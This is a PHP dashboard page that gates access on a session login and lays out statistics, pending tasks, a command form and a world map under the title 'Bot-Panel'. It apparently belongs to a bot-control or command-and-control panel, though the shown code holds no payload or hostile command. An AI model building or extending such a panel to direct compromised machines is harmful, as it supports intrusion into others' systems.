<?php
$status = session_status();
if($status == PHP_SESSION_NONE){
    //There is no active session
    session_start();
}
// $auth = $_SESSION["auth"];
// if ($auth == "1") {
if (!isset($_SESSION['loggedin'])) {
  header('Location: login_new.php');
  exit;
} else {
  ?>
  <!DOCTYPE html>
  <html lang="en">

  <head>
    <?php include_once 'components/meta.php'; ?>
    <title>Главная Bot-Panel</title>
    <?php include_once 'components/css.php'; ?>
    <link href="asset/vendor/datatables/dataTables.bootstrap4.css" rel="stylesheet">
    <link href="asset/vendor/responsive/css/responsive.dataTables.css" rel="stylesheet">
    <link href="asset/vendor/responsive/css/responsive.bootstrap4.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="asset/vendor/jvector/css/jvector.css">
  </head>

  <body id="page-top" class="bg-secondary">
    <?php include_once 'components/header.php'; ?>
    <div id="wrapper">
      <div id="content-wrapper">
        <div class="container-fluid">

          <ol class="breadcrumb bg-dark">
            <li class="breadcrumb-item text-success">
              <a>Общая Статистика</a>
            </li>
          </ol>

          <?php include_once 'components/stats.php'; ?>

          <form method="POST" action="server.php" id="Form_toverify" name="Form_toverify">

            <?php include_once 'task_to_verify.php'; ?>

            <div class="row">
              <?php include_once 'components/commands_toverify.php'; ?>
            </div>
        </div>
        </form>
      </div>
    </div>
    </div>

    <?php include_once 'components/footer.php'; ?>

    <?php include_once 'components/js.php'; ?>

    <script src="asset/vendor/datatables/jquery.dataTables.js"></script>
    <script src="asset/vendor/datatables/dataTables.bootstrap4.js"></script>
    <script src="asset/vendor/responsive/dataTables.responsive.js"></script>
    <script src="asset/vendor/responsive/responsive.bootstrap4.js"></script>
    <script src="asset/js/demo/datatables-demo.js"></script>
    <script src="asset/vendor/jvector/js/core.js"></script>
    <script src="asset/vendor/jvector/js/world.js"></script>
  </body>

  </html>

  </style>
  <?php
}
?>